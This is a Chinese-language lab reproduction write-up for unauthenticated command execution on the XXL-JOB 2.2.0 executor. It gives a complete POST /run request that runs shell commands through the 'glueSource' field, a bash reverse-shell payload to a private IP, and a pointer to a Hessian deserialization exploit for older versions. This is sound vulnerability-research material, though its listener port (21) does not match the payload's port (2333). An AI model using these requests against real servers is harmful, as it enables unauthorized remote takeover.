# XXL-JOB executor 未授权访问漏洞

## 环境搭建

执行如下命令启动2.2.0版本的XXL-JOB：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080即可查看到管理端（admin），访问http://your-ip:9999可以查看到客户端（executor）。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968083910-e85c890d-c488-4aa6-bd79-2b15ef8e39e3.png)

## 漏洞复现

向客户端（executor）发送如下数据包，即可执行命令：

```plain
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/success",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968084040-3e58502e-6eb3-4b60-b9d7-610b8ff6ce03.png)

touch /tmp/success已成功执行：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968084034-4f081f30-dbef-49ae-801b-bc032de3b987.png)

另外，低于2.2.0版本的XXL-JOB没有RESTful API，我们可以通过[Hessian反序列化](https://github.com/OneSourceCat/XxlJob-Hessian-RCE#tdsub)来执行命令。

### 反弹shell

发送数据包，执行反弹shell命令：

```plain
"glueSource": "bash -i >& /dev/tcp/192.168.174.128/2333 0>&1 "
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968084159-e13e3d09-1c7e-4a86-8c4d-3e4f8195af12.png)

监听21端口，接收反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968084092-d9c03c07-0344-4886-ac28-dbb14884bf8b.png)